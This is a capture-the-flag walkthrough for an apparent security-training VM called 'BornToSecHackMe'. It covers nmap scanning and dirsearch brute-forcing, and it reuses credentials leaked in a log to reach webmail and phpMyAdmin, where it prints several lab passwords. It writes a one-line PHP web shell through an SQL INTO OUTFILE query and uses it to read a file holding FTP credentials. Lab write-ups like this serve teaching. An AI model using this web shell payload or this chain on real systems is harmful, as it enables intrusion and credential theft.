
### Step 1.
```bash
# List all the devices in the private network (replace by network ip address)
sudo nmap --unprivileged -sn 192.168.64.0/24
```

Once revealed, let's add ip address to the env variables.
```bash
export IP=192.168.64.6
```

<hr>

### Step 2.
```bash
# List all the opened ports for specified ip address (replace by device ip address)
sudo nmap $IP
# or even better
sudo nmap -T4 -A -v $IP
```

<details>
    <summary>Info about of opened ports</summary>

```bash
21/tcp  open  ftp        vsftpd 2.0.8 or later
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap       Dovecot imapd
443/tcp open  ssl/http   Apache httpd 2.2.22 ((Ubuntu))
993/tcp open  ssl/imaps?
```

</details>

<details>
    <summary>More detailed info about of opened ports</summary>

```
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: SASL-IR IDLE listed have LITERAL+ capabilities ENABLE more post-login Pre-login LOGIN-REFERRALS OK LOGINDISABLEDA0001 IMAP4rev1 STARTTLS ID
|_ssl-date: 2022-10-08T19:41:46+00:00; 0s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22 ((Ubuntu))
| ssl-cert: Subject: commonName=BornToSec
| Issuer: commonName=BornToSec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-10-08T00:19:46
| Not valid after:  2025-10-05T00:19:46
| MD5:   3f63 02ca 0bb1 e732 9987 6887 3623 86a3
|_SHA-1: eebc f8de 3422 dd63 5314 9d47 811f f6d1 8f77 c98d
|_ssl-date: 2022-10-08T19:41:45+00:00; 0s from scanner time.
993/tcp open  ssl/imaps?
|_ssl-date: 2022-10-08T19:41:45+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

<hr>

### Step 3.

For this step we'll use dirsearch - an advanced web path brute-forcer.

See [github page](https://github.com/maurosoria/dirsearch) to know installation steps and advanced usage.


```bash
python3 dirsearch.py -e php -u https://$IP --exclude-status 400,401,404
```

<details>
    <summary>Dirsearch output from scanning https server</summary>

```bash
[10:36:23] 403 -  241B  - /cgi-bin/
[10:36:28] 301 -  249B  - /forum  ->  https://192.168.64.6/forum/
[10:36:34] 301 -  252B  - /phpmyadmin  ->  https://192.168.64.6/phpmyadmin/
[10:36:34] 200 -    2KB - /forum/
[10:36:37] 403 -  240B  - /server-status/
[10:36:37] 403 -  240B  - /server-status
[10:36:41] 200 -    2KB - /phpmyadmin/index.php
[10:36:41] 200 -    2KB - /phpmyadmin/
[10:36:42] 301 -  251B  - /webmail  ->  https://192.168.64.6/webmail/
[10:36:42] 403 -  254B  - /webmail/src/configtest.php
```

</details>


```bash
python3 dirsearch.py -e php -u http://$IP --exclude-status 400,401,404
```

<details>
    <summary>Dirsearch output from scanning http server</summary>

```
[10:30:07] 403 -  242B  - /.ht_wsr.txt
[10:30:07] 403 -  242B  - /.htaccess.sample
[10:30:07] 403 -  241B  - /.htaccess.orig
[10:30:07] 403 -  242B  - /.htaccess.bak1
[10:30:07] 403 -  240B  - /.htaccessOLD
[10:30:07] 403 -  241B  - /.htaccessOLD2
[10:30:07] 403 -  240B  - /.htaccess.save
[10:30:07] 403 -  237B  - /.htm
[10:30:07] 403 -  241B  - /.htaccessBAK
[10:30:07] 403 -  241B  - /.htaccess_sc
[10:30:07] 403 -  243B  - /.htaccess_orig
[10:30:07] 403 -  245B  - /.htpasswd_test
[10:30:07] 403 -  237B  - /.html
[10:30:07] 403 -  241B  - /.htpasswds
[10:30:07] 403 -  243B  - /.htaccess_extra
[10:30:07] 403 -  241B  - /.httr-oauth
[10:30:18] 403 -  240B  - /cgi-bin/
[10:30:21] 403 -  245B  - /doc/html/index.html
[10:30:21] 403 -  247B  - /doc/en/changes.html
[10:30:21] 403 -  243B  - /doc/stable.version
[10:30:21] 403 -  237B  - /doc/
[10:30:21] 403 -  239B  - /doc/api/
[10:30:22] 301 -  247B  - /fonts  ->  http://192.168.64.6/fonts/
[10:30:22] 403 -  239B  - /forum/
[10:30:22] 403 -  242B  - /forum/admin/
[10:30:22] 403 -  238B  - /forum
[10:30:22] 403 -  247B  - /forum/phpmyadmin/
[10:30:23] 403 -  248B  - /forum/install/install.php
[10:30:32] 403 -  240B  - /server-status/
[10:30:32] 403 -  239B  - /server-status
```

</details>

<hr>

### Step 4.
Go to the `https://$IP/forum/` <br>
Look into log file named `Probleme login ?`: 
```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

From this output we can understand, that `lmezard` tried to connect to the server <br>
and accidentally (or not) typed password in the login field. Such a mistake!

Use this pair to login as a user on the forum, and get the mail from account page. <br>
Mail: `laurie@borntosec.net`

<hr>

### Step 5.
We use this credentials to login to another revealed service (webmail)

Go to the `https://$IP/webmail/` <br>
Login: `laurie@borntosec.net` <br>
Password: `!q\]Ej?*5K5cy*AJ` <br>

Check out the mail with `DB Access` subject and get another credentials.

<hr>

### Step 6.

Check login credentials for the DB.

Go to the `https://$IP/phpmyadmin/` <br>
Login: `root` <br>
Password: `Fg-'kKXBj87E:aJ$` <br>

<hr>

### Step 7.

The next thing we'll do is trying to open a [webshell](https://en.wikipedia.org/wiki/Web_shell)

```bash
python3 dirsearch.py -e php -u https://$IP --exclude-status 400,401,404
```

<details>
<summary>Scan of /forum endpoint</summary>

```bash
[11:11:54] 301 -  254B  - /forum/images  ->  https://192.168.64.6/forum/images/
[11:11:54] 200 -  474B  - /forum/images/
[11:11:54] 301 -  255B  - /forum/includes  ->  https://192.168.64.6/forum/includes/
[11:11:54] 200 -  810B  - /forum/includes/

[11:11:55] 301 -  251B  - /forum/js  ->  https://192.168.64.6/forum/js/
[11:11:56] 200 -  519B  - /forum/js/
[11:11:56] 301 -  252B  - /forum/lang  ->  https://192.168.64.6/forum/lang/
[11:12:02] 301 -  254B  - /forum/modules  ->  https://192.168.64.6/forum/modules/
[11:12:02] 200 -  518B  - /forum/modules/

[11:12:14] 301 -  257B  - /forum/templates_c  ->  https://192.168.64.6/forum/templates_c/
[11:12:14] 200 -    1KB - /forum/templates_c/

[11:12:16] 301 -  253B  - /forum/themes  ->  https://192.168.64.6/forum/themes/
[11:12:16] 200 -  449B  - /forum/themes/
[11:12:17] 301 -  253B  - /forum/update  ->  https://192.168.64.6/forum/update/
```
</details>

From the scan we can understand that there are several accessible directories...

<hr>

### Step 8.

Go to the `https://$IP/phpmyadmin/` <br>
Login: `root` <br>
Password: `Fg-'kKXBj87E:aJ$` <br>

Create webshell file using SQL query
```SQL
SELECT '<?=`$_GET[x]`?>' INTO OUTFILE '/var/www/forum/templates_c/wsh.php'
```

### Step 9.
Using `wsh.sh` let's go through some directories...

This command reveals ftp credentials for lmezard.
```bash
$ cat /home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"
```